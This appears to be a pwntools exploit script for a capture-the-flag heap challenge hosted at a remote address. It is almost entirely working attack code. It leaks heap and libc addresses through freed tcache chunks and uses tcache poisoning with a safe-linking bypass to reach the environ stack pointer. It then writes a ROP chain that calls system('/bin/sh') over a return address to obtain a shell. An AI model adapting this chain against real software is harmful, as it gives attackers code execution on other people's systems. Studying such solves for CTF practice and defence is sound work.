from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("157.180.85.167", 50001)
    return r

r = conn()

def create(idx, size):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'Index: ', str(idx).encode())
    r.sendlineafter(b'Size: ', str(size).encode())

def edit(idx, data):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'Index: ', str(idx).encode())
    r.sendafter(b'Data: ', data)

def view(idx):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'Index: ', str(idx).encode())

def free(idx):
    r.sendlineafter(b'> ', b'4')
    r.sendlineafter(b'Index: ', str(idx).encode())

def main():
    # we want to create 9 chunks to fill up tcache bins and then free 8 of them to put them into the tcache list
    # This will allow us to leak heap and libc addresses later
    # the 9th chunk is to prevent the 8th consolidation with the top chunk 
    for i in range(9):
        create(i, 0x100)
    for i in range(8):
        free(i)
    
    #============leak heap and libc==========
    view(0)
    r.recvuntil(b'Chunk at index 0:\n')
    heap_base = u64(r.recv(5).ljust(8, b'\x00')) << 12
    log.info(f'leaked heap: {hex(heap_base)}')
    
    view(7)
    r.recvuntil(b'Chunk at index 7:\n')
    libc_leak = u64(r.recv(6).ljust(8, b'\x00'))
    log.info(f'leaked libc: {hex(libc_leak)}')
    libc.address = libc_leak - 0x1d3cc0
    log.info(f'libc base: {hex(libc.address)}')
    
    #=============use tcache poisoning to leak evniron stack ptr============
    env_ptr = libc.address + 0x1db320
    log.info(f'env_ptr: {hex(env_ptr)}')
    
    edit(6, p64(env_ptr ^ (heap_base >> 12)))
    create(9, 0x100)
    create(10, 0x100)
    view(10)
    
    r.recvuntil(b'Chunk at index 10:\n')
    env_leak = u64(r.recv(6).ljust(8, b'\x00'))
    log.info(f'leaked env_ptr: {hex(env_leak)}')
    
    #====================exploit ==========
    # we will use the leaked env_ptr to calculate the return address of the edit function and overwrite it with a ROP chain to get a shell
    ret_addr = env_leak - 0x140 - 0x8 - 0x40 
    # the offset is not exactly the ret address of edit function but it is close enough
    # I used this because the allocator drop and error when I tried to overwrite the return address -0x8
    log.info(f'calculated return address: {hex(ret_addr)}')
    pop_rdi = libc.address + 0x277e5
    system = libc.address + 0x4c490
    binsh = libc.address + 0x197031
    ret = libc.address + 0xfdd10
    
    payload = flat(
        b'A' * 0x28,
        ret,
        pop_rdi,
        binsh,
        system
    )
    for i in range(12, 19):
        create(i, 0x120)
    
    for i in range(12, 19):
        free(i)
    
    edit(18, p64(ret_addr ^ ((heap_base >> 12) + 0x1)))
    create(19, 0x120)
    create(20, 0x120)
    edit(20, payload)

    
    r.interactive()

if __name__ == "__main__":
    main()
